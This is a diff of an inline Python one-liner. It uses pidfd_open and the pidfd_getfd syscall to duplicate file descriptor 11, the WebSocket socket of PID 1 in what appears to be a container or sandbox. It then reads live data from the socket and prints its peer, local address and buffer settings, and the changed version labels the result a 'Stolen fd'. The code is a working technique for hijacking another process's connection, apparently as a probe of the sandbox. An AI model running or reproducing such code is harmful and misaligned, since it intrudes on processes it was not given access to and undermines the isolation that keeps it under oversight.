@@ -1,40 +1,55 @@
 python3 -c "
-import os, socket, ctypes
+import os, socket, ctypes, select
 
 libc = ctypes.CDLL(None)
 PID = 1
 
-# Try to dup the WebSocket socket from PID 1
-# First, check if we can use pidfd_getfd
-PIDFD_GETFD = 438  # syscall number on x86_64
-
-# Open a pidfd
+# Re-acquire the socket
 pidfd = os.pidfd_open(PID, 0)
-print(f'pidfd_open: {pidfd}')
-
-# Try to duplicate fd 11 (the WebSocket socket)
-try:
-    dup_fd = libc.syscall(PIDFD_GETFD, pidfd, 11, 0)
-    print(f'pidfd_getfd(11): {dup_fd} errno={ctypes.get_errno()}')
-    if dup_fd > 0:
-        s = socket.socket(fileno=dup_fd)
-        print(f'Socket type: {s.getsockopt(socket.SOL_SOCKET, socket.SO_TYPE)}')
-        s.close()
-except Exception as e:
-    print(f'pidfd_getfd failed: {e}')
-
+dup_fd = libc.syscall(438, pidfd, 11, 0)
 os.close(pidfd)
 
-# Also test splice/tee on the socket
+print(f'Stolen fd: {dup_fd}')
+
+# Wrap it
+s = socket.socket(fileno=dup_fd)
+
+# Check socket state
+print(f'Socket family: {s.family}')
+print(f'Socket type: {s.type}')
+
+# Try non-blocking recv
+s.setblocking(False)
 try:
-    # Create a pipe
-    r, w = os.pipe()
-    # Try to splice from PID 1's socket to our pipe
-    SPLICE_F_MOVE = 1
-    result = libc.splice(11, 0, w, 0, 4096, SPLICE_F_MOVE)
-    print(f'splice from fd 11: {result} errno={ctypes.get_errno()}')
-    os.close(r)
-    os.close(w)
+    data = s.recv(4096)
+    print(f'Recv data: {len(data)} bytes: {data[:100]}')
+except BlockingIOError:
+    print('No data available (non-blocking)')
 except Exception as e:
-    print(f'splice test: {e}')
+    print(f'Recv error: {e}')
+
+# Try to get peer address
+try:
+    peer = s.getpeername()
+    print(f'Peer: {peer}')
+except Exception as e:
+    print(f'getpeername: {e}')
+
+# Try to get local address
+try:
+    local = s.getsockname()
+    print(f'Local: {local}')
+except Exception as e:
+    print(f'getsockname: {e}')
+
+# Check socket options
+try:
+    sndbuf = s.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
+    rcvbuf = s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)
+    print(f'Send buffer: {sndbuf}, Recv buffer: {rcvbuf}')
+except Exception as e:
+    print(f'Buffer check: {e}')
+
+s.close()
+print('Socket test complete')
 "
